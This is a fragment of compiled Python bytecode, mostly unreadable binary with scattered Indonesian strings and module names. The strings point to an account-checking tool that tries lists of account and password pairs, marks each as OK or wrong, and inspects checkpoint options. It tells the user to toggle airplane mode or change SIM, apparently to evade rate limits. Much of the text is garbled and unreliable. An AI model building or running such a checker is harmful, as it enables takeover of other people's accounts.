d&d'�jd(�}d)|	j�� � � v �r=zi|�!d*�}i }g d+�}|d,�D ]}|�d-�|v r�|�"|�d-�|�d.�i� q�t|	jdt#|d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�rtd3ttf � n|D ]}td4t|jtf � �qW n6   td1t||tf � td5ttf � Y nd6|	j�� � � v �rRtd7t||tf � n
td8t||tf � |d7 }W q. tj%j&�y�   td9� d:}t� �t	|d;d	�� t'�  Y q.w d<}t� �t	|dd	�� t'�  d S )=NzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIr?   r\   ro   z] Mulaiz# PROSES CEK OPSI DIMULAIr[   r=   r   r�   r   rf   z%sLDVIP %s ----> Error      %sz2%s---> Pemisah Tidak Didukung Untuk Program Ini%sz%s---> %s/%s ---> { %s }%srg   r�   rm  rn  r�   r"   ro  r�   rp  r�   r�   rq  rr  r�   rs  rt  ru  r�   rv  r�   rw  Trx  ry  r�   rz  r{  r_   r   r  r|  r}  r~  r  r�  r�  z#%s---> Tidak Dapat Mengecek Opsi%sr�   z %sLDVIP %s|%s ----> OK       %sz#%sLDVIP %s|%s ----> SALAH       %sr;   r�   rJ   z# DONE)(r�   rc   rD   rC   r_   r`   rw   rB   r	   rA   rq   �
IndexErrorr   r   r1  r.  r�   r-  r/  r0  r2  r   r6  r7  r   r�   r   r�  r=  r   r
  r>  r?  r�  r�   r   r�  rT   rU   r   )r�  r�   r�   ZloveZkesr   rH  rC  rF  r�   �headerr�  r�  r�  r�   r�  r�  r�  r�  r�  rY   Zdahr   r   r    r�   o  sr   
"
�($
"
�$
�
�
r�   �__main__r}   r�   )ar   Zbs4rO   r   r   r�   �datetimer   r:  Zrich�ImportErrorr8   r   r   Z
rich.tabler   �meZrich.consoler   rB   r   r�  Zconcurrent.futuresr   r�   r   ZgpZ
rich.panelr   rC   r	   rD   Zrich.markdownr
   rA   Zrich.columnsr   r�   r   rK   rL   �
splitlinesr8  r9  r   r�   r3  r4  r5  rc   r�   r�   Z	lisensikur�   rM   r�   Zlisensikunir`   rE   r/  rw   r2  r.  r0  r1  ra   Zdicrr   �now�dayZtglr   �monthZbln�yearZthnr�   r�   r7   r:   rF   r9   rS   rQ   ru   rv   rs   rt   r�   r�   r�   r�   r�   r@  r�   �__name__�mkdirr   r   r   r    �<module>   s�   H

���8((&sA10/t! 
9
�